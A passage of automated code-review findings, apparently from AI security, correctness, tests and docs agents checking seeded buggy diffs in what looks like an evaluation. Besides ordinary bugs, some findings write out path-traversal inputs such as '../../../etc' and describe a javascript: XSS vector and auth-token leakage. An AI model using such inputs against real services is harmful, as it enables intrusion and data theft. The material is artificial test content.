Use the existing async client pattern instead, matching `fetch_plan` above: take (or construct) an `httpx.AsyncClient` and `await client.get(...)`. If the synchronous library must be kept, wrap it in `await asyncio.to_thread(...)` so the loop stays free. The new `import requests` on line 2 can then be dropped.

findings.title: No test coverage for new fetch_plan_limits function
findings.body: fetch_plan_limits is a new async function that performs a blocking requests.get call and returns parsed JSON. No test in this diff exercises it, so a wrong URL, wrong timeout, a swapped sync/async behavior, or the blocking-call regression itself would all pass unnoticed. Since this is an async function whose defining risk is blocking the event loop, a test asserting it returns expected data (with requests.get mocked) and/or a test that flags the sync call inside async code would catch regressions here.

findings.title: Unencoded tenant_id interpolated into internal billing URL path
findings.body:
`fetch_plan_limits` builds `https://billing.internal/limits/{tenant_id}` by f-string with no validation or percent-encoding of `tenant_id`. If `tenant_id` is derived from a request (path segment, header, JWT claim, or query param), a caller can inject `/`, `..`, `?` or `#` into it and change which resource on the internal billing service is requested — e.g. `../../admin/tenants` or `123?scope=all`. requests/urllib3 do not strip dot-segments, so the receiving service sees whatever was sent, and `requests.get` follows redirects by default, so a crafted path landing on a redirecting endpoint can widen the reach further.

Mitigation: validate `tenant_id` against the expected shape (e.g. UUID or `^[0-9a-zA-Z_-]+$`) before use, or `urllib.parse.quote(str(tenant_id), safe="")`, and consider `allow_redirects=False` for an internal service call.

Adversary: any client that can influence the tenant identifier reaching this helper. What they control: the path segment. What they get: requests to arbitrary paths on an internal, likely network-trusted billing host, potentially returning another tenant's limits or non-tenant-scoped data.

findings.title: Bare `except` swallows BaseException and logs nothing
findings.body:
`except:` with no exception class catches `BaseException`, so `KeyboardInterrupt`, `SystemExit` and `GeneratorExit` raised while `_client.send` is in progress are absorbed and turned into a silent `None`. That makes the process hard to interrupt or shut down and can mask a `MemoryError` as a successful-looking no-op. It also contradicts the stated intent of the PR ("catch and log, then continue") — there is no logging at all, so a persistently failing metrics backend becomes invisible. Narrow this to `except Exception as exc:` (or the specific client/transport error) and emit a warning-level log including `exc` before returning `None`.

_Also raised by the security agent:_ Bare except silently swallows metrics failures despite "and log" intent

findings.title: No test verifies push_metrics swallows exceptions
findings.body: The change makes push_metrics catch all exceptions from _client.send and return None instead of propagating. There is no test in this diff exercising this behaviour, so a regression (e.g. removing the try/except, or re-raising) would not be caught by any existing test.

findings.title: try_consume checks and updates outside the lock: rate limit bypassable
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` on line 15, evaluates the limit on line 16, then `await asyncio.sleep(0)` on line 18 explicitly yields control to the event loop before writing `_counters[tenant] = current + cost` on line 19. None of this is inside `_lock`, which the existing `consume` correctly holds.

A client that issues N requests concurrently (trivial on an async server — they are all resumed from the same event loop) has every coroutine read the same `current` before any of them writes. All N pass the `current + cost > LIMIT` check, and the last write stores `current + cost`, not `current + N*cost`. The counter effectively advances by one request's worth no matter how many were admitted, so a tenant can drive arbitrary traffic through a limiter that reports itself as under budget. The unlocked write also clobbers increments made by `consume` under the lock, corrupting accounting for other call sites.

Fix: perform the read, the check and the write inside `async with _lock:` exactly as `consume` does, and drop the bare `await` from the critical section (or ensure any awaited work happens before the check, not between check and write).

_Also raised by the correctness agent:_ try_consume checks and writes without the lock, across an await

findings.title: try_consume's race condition and limit enforcement are untested
findings.body: try_consume reads _counters (line 15) outside of _lock, awaits (line 18), then writes (line 19) — a classic check-then-act race under concurrent calls for the same tenant, which is exactly the bug class this eval is named for. There is no test in this diff exercising concurrent calls to try_consume for the same tenant, nor a test verifying LIMIT is actually enforced (that a call exceeding LIMIT returns False and does not mutate the counter). As written, a wrong or fixed implementation would look identical to any existing test suite that doesn't target this function.

findings.title: Return shape change breaks tuple-unpacking caller in reports/weekly.py
findings.body: `lookup_user` now returns `{"name": ..., "email": ..., "tier": ...}` instead of the `(name, email)` tuple. The existing caller `render_row` in `reports/weekly.py` does `name, email = lookup_user(user_id)`. Unpacking a dict iterates its keys, so this will raise `ValueError: too many values to unpack (expected 2)` on every call \u2014 and even if the dict had exactly two keys it would bind key strings, not values, producing silently wrong output. Either update every caller in the same change (`name, email = u["name"], u["email"]`), or keep the tuple contract and add a separate function/`NamedTuple` that is both index- and key-addressable.

findings.title: Docstring contradicts actual return type
findings.body:
The docstring states the function returns `(name, email)` as a tuple, but line 6 now returns a dict with keys 'name', 'email', and 'tier'. Callers relying on the documented tuple unpacking will break. Update the docstring to describe the new return contract: a dict with 'name', 'email', and 'tier' keys.

_Also raised by the correctness agent:_ Docstring still promises the old (name, email) tuple

findings.title: Return-shape change breaks caller, uncaught by any test
findings.body: lookup_user now returns a dict instead of a (name, email) tuple. The existing caller reports/weekly.py:render_row does `name, email = lookup_user(user_id)`, which will raise (or silently misbehave) against a dict since unpacking a dict yields its keys, not the intended values. There is no test in this diff or referenced repository context that exercises lookup_user's return value against its callers, so this contract break would ship undetected.

findings.title: WriteSettlement always returns nil; insert failure is swallowed
findings.body:
The `err` bound by `if _, err := db.Exec(...); err != nil` is scoped to that `if` statement. After logging, control falls through to `var err error` (line 18), a brand-new zero-valued variable, so `return err` on line 19 returns `nil` unconditionally on every path past validation.

Consequence: a caller that does `if err := WriteSettlement(db, s); err != nil { ... }` — the same contract `WriteEntry` above honours by returning the `db.Exec` error directly (line 8) — will treat a failed INSERT as a successful settlement and go on to mark the row settled/acknowledged. Settlement rows are silently dropped with only a log line.

Fix: return the insert error, i.e.

```go
if _, err := db.Exec(...); err != nil {
    log.Printf("settlement insert failed: %v", err)
    return err
}
return nil
```

If log-and-continue really is the intended batch behaviour, then the `error` return value is misleading and should be removed (or the error wrapped as a non-fatal sentinel the caller can test), because as written no caller can distinguish success from failure. The dead `var err error` on line 18 suggests the former was intended.

_Also raised by the security agent:_ Failed settlement insert is swallowed; function always returns nil

_Also raised by the docs agent:_ WriteSettlement swallows errors despite error return type

findings.title: No test would catch WriteSettlement always returning nil
findings.body: WriteSettlement declares a fresh `var err error` on line 18 and returns it unconditionally on line 19, so the function always returns nil even when the db.Exec on line 15 fails (the failure is only logged). No test file is included in this diff, so this silent-swallow behavior — callers never learning that a settlement insert failed — is completely uncovered. A test exercising a failing db.Exec (e.g. via a mock/stub DB) and asserting a non-nil error would immediately catch this, but no such test exists.

findings.title: Mutable default argument accumulates state across calls
findings.body:
`attempted=[]` is evaluated once at function-definition time, so every call that omits `attempted` shares the same list object. Line 10 appends to it and line 11 returns it, so the second call returns the failures from the first call plus its own, and the list grows without bound for the lifetime of the process. Callers that treat the return value as "failures for this batch" will re-process or re-report stale recipients.

Use `attempted=None` and initialise inside the body:

    def send_with_retries(recipients, attempted=None):
        attempted = list(attempted) if attempted else []

Note also that if a caller *does* pass a list, line 10 mutates the caller's object in place, which is a second, separate surprise.

findings.title: No test covers send_with_retries or its mutable-default bug
findings.body: send_with_retries uses attempted=[] as a default argument, which is shared across calls and will silently accumulate recipients from previous invocations that didn't pass their own list. There is no test in this diff exercising this function, so a call sequence like send_with_retries([a]) then send_with_retries([b]) returning [a,b] instead of [b] would go unnoticed. A test asserting the returned list only contains recipients from the current call (and calling the function twice in sequence) would catch this.

findings.title: Shared mutable default leaks recipients between callers of send_with_retries
findings.body:
`attempted=[]` is evaluated once at function definition, so the same list object is reused by every caller that does not pass `attempted` explicitly. Failed recipients from call A are appended to the same list and returned to call B, so caller B receives recipient identifiers it never supplied — if callers are different tenants, users or requests, that is a cross-context disclosure of recipient addresses. The list also never shrinks, so long-lived processes accumulate one entry per failed dispatch forever, which an attacker who can reliably cause dispatch failures can drive into unbounded memory growth.

Fix: `def send_with_retries(recipients, attempted=None):` then `attempted = list(attempted) if attempted is not None else []` at the top of the body.

Caveat I could not resolve: the entry point is not in this diff and no repository context was retrieved, so I cannot confirm whether callers are per-request/per-tenant (disclosure) or a single trusted loop (then this is only a correctness and memory bug).

findings.title: Rounding threshold changed from >= 0.5 to > 0.5 in a rename-only PR
findings.body:
`calc_rounding` returned `1 if line.remainder_cents >= 0.5 else 0`; the renamed `compute_rounding` returns `1 if line.remainder_cents > 0.5 else 0`. This is a behavioural change, not a rename: a line with `remainder_cents == 0.5` — the exact half-cent case that this half-up rounding rule exists to decide — now rounds down to 0 instead of up to 1. In billing this shifts money by a cent per affected line and will diverge from any previously issued invoice, reconciliation total, or stored expectation. Nothing in the PR description mentions a rounding policy change. Restore `>=` unless the change is intentional, in which case it needs its own PR, a test covering the `0.5` boundary, and a note about the effect on historical totals.

_Also raised by the tests agent:_ Rounding boundary changed from >= to > during 'rename-only' PR

findings.title: page_of_sorted returns fewer items than page_of for same input
findings.body:
The function `page_of_sorted` uses `start + PAGE_SIZE - 1` in its slice end, whereas the existing `page_of` function uses `start + PAGE_SIZE`. This means `page_of_sorted` returns one fewer item than `page_of` for the same page number, breaking the implicit contract that both functions should return the same number of records per page. A caller expecting consistent pagination behavior would get incomplete pages.

_Also raised by the correctness agent:_ Off-by-one slice drops one record per page in page_of_sorted

findings.title: New paginated-sort function has no test and contains an off-by-one bug
findings.body: page_of_sorted slices ordered[start : start + PAGE_SIZE - 1], which returns only PAGE_SIZE-1 records per page instead of PAGE_SIZE, silently dropping one record per page. No test exercises this function, so nothing would catch either the off-by-one slicing or a regression in the sort-then-page behavior.

findings.title: purchase_order is Optional; .upper() will raise AttributeError
findings.body:
`Invoice.purchase_order` is typed `str | None` and the model docstring says it is only set for customers on invoicing terms ("roughly one account in twenty"). The removed `if invoice.purchase_order is not None:` guard was therefore load-bearing, not redundant: for the ~95% of invoices without a PO, `invoice.purchase_order.upper()` raises `AttributeError: 'NoneType' object has no attribute 'upper'` and header rendering fails outright.

Restore the conditional append (or build the list and conditionally extend it), e.g.:

```python
def header_lines(invoice):
    lines = [f"Invoice {invoice.number}"]
    if invoice.purchase_order is not None:
        lines.append(f"PO {invoice.purchase_order.upper()}")
    return lines
```

findings.title: No test covers header_lines with purchase_order=None
findings.body: header_lines() previously guarded against invoice.purchase_order being None (per models/invoice.py, it's optional and unset for ~95% of invoices). The rewrite removes that guard and calls .upper() unconditionally, which will raise AttributeError for the common no-PO case. Nothing in this diff, or apparently in the existing suite, exercises header_lines with purchase_order=None, so this regression would ship silently.

findings.title: File handle leaked on header-mismatch return and on exceptions
findings.body:
`fh = open(path)` is only closed on the single success path at line 16. When the header does not match (line 13-14) the function returns `None` without closing, and any exception raised by `next(reader)` or `list(reader)` (decode errors, `csv.Error`, `StopIteration`) also escapes with the handle open. Since rejecting bad headers is the stated purpose of this function, the leaking path is the common one, not a rare one. Use the same `with open(path) as fh:` form as `read_rows` on line 5 and put the whole body inside it.

_Also raised by the security agent:_ File handle leaked on header-mismatch path (FD exhaustion risk)

findings.title: New read_validated function has no test coverage
findings.body: The new read_validated function introduces branching behavior (header mismatch returns None without closing fh, valid header path returns rows) but no test file is included in this diff. In particular the early-return branch on line 14 leaks the open file handle, and nothing would catch this regression since there is no test exercising the mismatched-header path or verifying the file is closed.

findings.title: Retry wraps non-idempotent charge(), risking duplicate charges
findings.body:
`@retry(attempts=3)` re-invokes `charge(card_token, amount_cents)` on any failure. `billing.gateway.charge` is documented as NOT idempotent — each call creates a new charge — so a timeout or 5xx returned *after* the gateway created the charge will cause a second and third charge for the same purchase. The read path (`fetch_charge` -> `get_charge`) is safe to retry, but this one is not.

Fix: generate a stable idempotency key per logical charge attempt (e.g. derived from an order/payment id, not per retry) and pass it through `charge()` using the gateway's Idempotency-Key header before enabling retries; or restrict retries to errors that are provably pre-send (connection refused / DNS), not response timeouts.

_Also raised by the security agent:_ Retry wraps non-idempotent charge() with no Idempotency-Key

findings.title: Retry wrapper contradicts non-idempotent function's contract
findings.body:
The `charge_card()` function wraps `charge()` with automatic retries, but the underlying `charge()` function is explicitly documented as NOT idempotent: "each call creates a new charge." The docstring of `charge()` warns that retries are only safe if an Idempotency-Key header is passed. The retry wrapper does not pass such a key, so retrying will create duplicate charges on transient failures. A caller reading the `charge()` docstring would correctly avoid retrying it directly, but the `charge_card()` wrapper silently retries anyway, violating that contract.

Either: (1) add Idempotency-Key support to the wrapper, (2) add a docstring to `charge_card()` clearly stating that it retries and why that is safe, or (3) do not retry the charge operation.

findings.title: No test guards retrying a non-idempotent charge call
findings.body: charge_card wraps billing.gateway.charge with @retry(attempts=3), but charge() is documented as NOT idempotent and creates a new charge on every call. There is no test here that would catch a scenario where a transient failure (e.g., timeout after the charge succeeded server-side) causes a retry to double-charge. Since this is a behavioral change (retry now applied to a call previously left alone) and no test exercises the retry-on-failure path for charge_card, a regression that duplicates charges would go undetected.

findings.title: Naive datetime.now() subtracted from tz-aware expires_at raises TypeError
findings.body:
`cutoff` is built from `datetime.now()` with no tzinfo, so it is naive. The retrieved model documents `expires_at` as "always tz-aware, set from datetime.now(timezone.utc)", and the sibling function `is_expired` on line 5 correctly uses `datetime.now(timezone.utc)`. Subtracting a naive datetime from an aware one raises `TypeError: can't subtract offset-naive and offset-aware datetimes`, so `expires_within` fails unconditionally for every input — there is no reachable path where it returns a value.

Fix: `cutoff = datetime.now(timezone.utc).replace(microsecond=0)`. (The `.replace(microsecond=0)` also introduces up to one second of downward bias in `delta`; dropping it would be more accurate, but it is harmless compared to the tz bug.)

findings.title: Timezone-naive datetime compared against timezone-aware field
findings.body: The `expires_within` function creates a timezone-naive datetime via `datetime.now().replace(microsecond=0)` on line 9 and compares it directly against `invite.expires_at` on line 10. However, the `Invite` model's docstring explicitly documents that `expires_at` is always timezone-aware UTC. This violates the documented contract and will produce incorrect results: comparing naive and aware datetimes is either a TypeError or produces nonsensical comparisons depending on Python version and context.

findings.title: No test covers expires_within, which would crash on any call
findings.body: expires_within is new, untested code. It subtracts a naive datetime.now() cutoff from invite.expires_at, which per the repo's own model docstring is always tz-aware. Subtracting a naive and aware datetime raises TypeError. There is no test in this diff exercising expires_within, so this defect would ship silently.

findings.title: Public function signature does not match defensive implementation
findings.body:
The function `contactEmail(account: Account)` accepts an `Account` type, where `billingContact` is optional per the type definition. However, the implementation unconditionally accesses `account.billingContact.email` without checking whether `billingContact` exists. This will throw a runtime error if called on an account without a billing contact, contradicting the type signature's promise that the function can safely handle any valid `Account`.

Either narrow the type signature to require `billingContact` be present (e.g., `account: Account & { billingContact: { name: string; email: string } }`), add a null check in the implementation, or document that the function requires a billing contact and add a guard at the call site.

_Also raised by the correctness agent:_ contactEmail dereferences optional billingContact

findings.title: No test covers contactEmail with missing billingContact
findings.body: contactEmail accesses account.billingContact.email without a null check, despite billingContact being optional (per types.ts). No test exercises the case where billingContact is undefined, so a null-dereference bug introduced here (or regressed later) would not be caught by any existing test.

findings.title: timeout=30 is 30 milliseconds, not 30 seconds
findings.body:
`fetch`'s docstring states `timeout` is in MILLISECONDS and that callers wanting seconds must multiply. The PR description says the timeout was "set generously since their API is slow", but `timeout=30` gives the partner API 30 ms total — and that budget is shared across the 3 default retries. This will fail on every nightly run against a slow endpoint. Use `timeout=30_000` (or whatever the intended second count × 1000) and consider whether the default `retries=3` sharing that same budget is what you want.

_Also raised by the docs agent:_ Function signature contract violation: timeout parameter misuse

findings.title: Timeout unit mismatch: docstring says milliseconds, code passes seconds
findings.body: The `fetch()` function's docstring clearly states that `timeout` is in MILLISECONDS, matching the underlying transport. The caller must multiply if seconds are desired. However, line 9 passes `timeout=30`, which appears to be intended as 30 seconds (a reasonable timeout for a slow API), but will be interpreted as 30 milliseconds — far too short. This violates the documented contract and will cause the nightly sync to fail with timeout errors.

findings.title: No test covers sync_partner_catalogue's timeout behaviour
findings.body: sync_partner_catalogue calls fetch(url, timeout=30) with no accompanying test. fetch's docstring states timeout is in milliseconds, so timeout=30 likely means the request times out almost immediately instead of the intended 30 seconds. There is no test asserting the timeout value passed to fetch or verifying the returned catalogue, so this unit mismatch would ship silently and nothing in the test suite would fail.

findings.title: Index duplicates existing invoices_tenant_created_idx from migration 0007
findings.body:
`invoices_tenant_recent_idx` is defined as `ON invoices (tenant_id, created_at DESC)` — byte-for-byte the same key and sort order as `invoices_tenant_created_idx`, already applied in `migrations/0007_invoice_indexes.sql` on 2025-11-02. The planner will only ever use one of them; the other is pure overhead on every INSERT/UPDATE/DELETE to `invoices`, plus duplicated disk and vacuum cost on what is presumably a large table.

`IF NOT EXISTS` does not protect against this: it matches on index *name*, not on the index definition, so the differing name means this will be created rather than skipped. If the reporting query is not using the existing index, the fix is to investigate why (statistics, predicate shape, a missing INCLUDE column) rather than to add a second copy. Otherwise drop this statement.

findings.title: priority=9 deprioritises reset mail; scale is inverted (0 drains first)
findings.body:
`enqueue`'s docstring states the priority argument is an ordering index where **0 is drained first and 9 is drained last**, and explicitly warns that the name suggests the opposite. Passing `priority=9` therefore places password-reset email behind every other job on the queue \u2014 strictly worse than the previous implicit default of 5, and the exact opposite of the PR's stated goal of getting resets ahead of the nightly digest batch. The effect is users waiting even longer for reset tokens, which is a user-facing auth-flow regression. Use `priority=0` (or a low value below whatever the digest batch uses) instead.

_Also raised by the security agent:_ priority=9 drains last — password resets moved behind digests, not ahead

findings.title: Priority queue documentation contradicts the code change
findings.body: The code now enqueues password resets with priority=9, but the documented behavior in `queue/priority.py` explicitly states that priority 9 means a job 'waits behind every other job on the queue.' The PR description says password resets should be queued 'ahead of digests', but priority=9 achieves the opposite of what the documentation says about priority ordering. Either the priority value is wrong, or the documentation in queue/priority.py needs updating to reflect an inverted understanding of the priority scale.

findings.title: Priority inversion bug has no test to catch it
findings.body: send_reset_email now calls enqueue(..., priority=9). Per queue/priority.py's docstring, priority 0 drains first and 9 drains last — the opposite of the intuitive reading, and the docstring explicitly warns this has caught people before. Setting priority=9 makes the reset email run *last*, worse than the previous default of 5, contradicting the PR's stated goal of bumping resets ahead of the digest batch. There is no test asserting the ordering/priority value passed to enqueue, so this regression would ship silently.

findings.title: upsert called with unnormalized terms violates documented contract
findings.body:
`search/index.py:upsert()` has a documented requirement that `terms` must be lower-cased before being passed to it. The docstring explicitly warns: "a term differing only by case creates a second posting list, and queries — which do lower-case — will never match it. The document then indexes successfully and is silently unfindable by that term."

Line 7 calls `upsert(article.id, article.title.split())` without lowercasing `article.title` first. This violates the documented contract and will cause articles to be unfindable by search queries that match the title's actual case pattern.

findings.title: upsert called with un-normalised title terms
findings.body:
`upsert` documents that `terms` must already be lower-cased and de-duplicated, and explicitly warns that it performs no normalisation: a term differing only by case creates a second posting list that lower-casing queries will never match. `article.title.split()` yields the raw words of the title, so a title like "Indexing New Articles" is indexed under `Indexing`/`New`/`Articles` and a query for `indexing` finds nothing. The publish call still succeeds, so the failure is silent.

Normalise before the call, e.g. `upsert(article.id, {w.lower() for w in article.title.split()})` (a set also satisfies the de-duplication half of the contract). Consider stripping punctuation too, since `split()` leaves trailing commas and periods attached to words.

findings.title: No test covers that published articles are actually searchable
findings.body: publish() now calls upsert(article.id, article.title.split()), but article.title.split() is not lower-cased, and upsert's documented contract explicitly warns that un-normalised terms silently create unfindable postings. There is no test in this diff that indexes an article with mixed-case terms and then queries for it in lower-case to confirm it's actually findable. Such a test would currently fail (or should), catching this exact class of bug that the docstring warns about.

findings.title: Removing Referer scrubbing leaks auth tokens into logs
findings.body:
The removed branch passed the `Referer` value through `_scrub_uri(value, extra_param_keys)` before logging it. Per `jupyter_server/auth/identity.py`, notebook URLs are handed out as `{base}?token={token}`, so the browser sends that token back in the `Referer` header on every subresource request. With the scrubbing gone, any 5xx response causes the full referring URL — including the live auth token — to be serialised into the log via `json.dumps(headers, ...)`. Anyone with read access to the logs (or a log shipper/aggregator) can lift the token and authenticate as that user.

Restore the per-header scrub for `Referer` (and keep the `extra_param_keys` argument wired through), or scrub the assembled dict before logging. If the intent was only to simplify the loop, keep the special case:

```python
value = request.headers[header]
if header == "Referer":
    value = _scrub_uri(value, extra_param_keys)
headers[header] = value
```

Also note that dropping the only use of `extra_param_keys` leaves that parameter dead, which is a signal the removal was unintentional rather than a deliberate contract change.

_Also raised by the security agent:_ Auth token leaked into logs via unscrubbed Referer header

findings.title: Removed Referer scrubbing has no visible test coverage
findings.body: The change deletes the `_scrub_uri` call that previously redacted sensitive query params (e.g. auth tokens, per `token_authenticated_url`) from the Referer header before logging. This is a behavior change that causes secrets to be logged verbatim on 5xx errors. No test file is part of this diff, so there is nothing shown that would fail as a result of this regression. If a repository test exercises this logging path with a tokenized Referer and asserts the scrubbed form, it should now fail — but that test is not part of the diff, so it's unclear whether it exists or was also modified/removed. A test asserting that a token-bearing Referer is redacted in the JSON log output is needed to catch this class of regression going forward.

findings.title: xlinkhref no longer validated, allowing javascript: URIs through
findings.body: Removing `attribute === 'xlinkhref'` from this condition does not remove the attribute from the sanitiser's output — it removes it from the only branch that calls `isAnchorLinkAllowed(value)`. `xlink:href` values now fall through to whatever the function's default return is, which for an attribute that previously required scheme checking means unvalidated values reach the DOM. `xlink:href` is directly script-executing in SVG: `` navigates on click, and per the file header comment this markdown is author-supplied by end users. That is stored XSS. If the intent really is to stop supporting this attribute, the fix is to reject it (return `false`) or strip it from the allowed-attribute list, not to delete it from the value-validation branch. If the intent was only to shrink the list of *rendered* SVG attributes, this line is the wrong place — restore `attribute === 'xlinkhref'` here. _Also raised by the security agent:_ xlink:href no longer scheme-checked, reopening SVG javascript: XSS

findings.title: No test guards xlinkhref validation behavior change
findings.body: The diff removes 'xlinkhref' from the set of attributes validated by isAnchorLinkAllowed, meaning an xlink:href attribute value like 'javascript:...' would no longer be checked against unsafeLinkPrefix. There is no test file in this change, and nothing shown in the surrounding repo indicates existing test coverage exercises the xlinkhref case specifically. If this change is wrong (i.e., xlinkhref still needs sanitisation because it can render as a live link/XSS vector), no test would fail — the change would silently ship.

findings.title: Removing ValidateID lets query `project` traverse out of the storage root
findings.body:
`query.GetProjectQueryParam()` is raw, unauthenticated-client-controlled input from the HTTP query string. Before this change it was constrained by `common.ValidateID`, which is what kept it to an identifier shape. With the check deleted, a value such as `../../../etc` flows unchecked into the list path, and the file DAO's `buildPath` does `filepath.Join(d.Folder, project, kind)` — `filepath.Join` cleans `..` segments by resolving them, it does not confine the result to `d.Folder`. The retrieved doc comment on `buildPath` states outright that "callers are required to have validated the names before this point"; this handler was that caller.

Adversary: any client that can reach the list endpoint. Controls: the entire `project` query string. Gets: read/enumeration of directories outside the configured storage root (and whatever downstream resource resolution keys off the escaped project name).

Restore the `common.ValidateID(projectQueryParameter)` check, or, if the intent is to centralise validation, add an explicit containment check in `buildPath` (e.g. resolve and verify the result still has `d.Folder` as a prefix) before removing the caller-side guard. The `parameters.Project != projectQueryParameter` comparison left on line 4 is not a substitute — it only runs when a path project is also present, and it compares two values rather than validating either.

_Also raised by the correctness agent:_ Removing ValidateID violates buildPath's documented caller precondition

findings.title: No test covers removal of project-name validation path
findings.body: The diff removes the common.ValidateID(projectQueryParameter) check and its bad-request error path. If this removal is wrong (e.g. an invalid or path-traversal project name like '../../etc' is now passed through to buildPath), there is no test in this change that exercises list() with a malformed projectQueryParameter to confirm the expected behavior (either that it's rejected, or that it's now safely handled downstream). A test asserting HandleBadRequestError was previously implied to exist or was trivial; either way, nothing here verifies the new behavior when the query parameter is invalid.

findings.title: Unbounded buffer reserved from client-controlled Content-Length
findings.body:
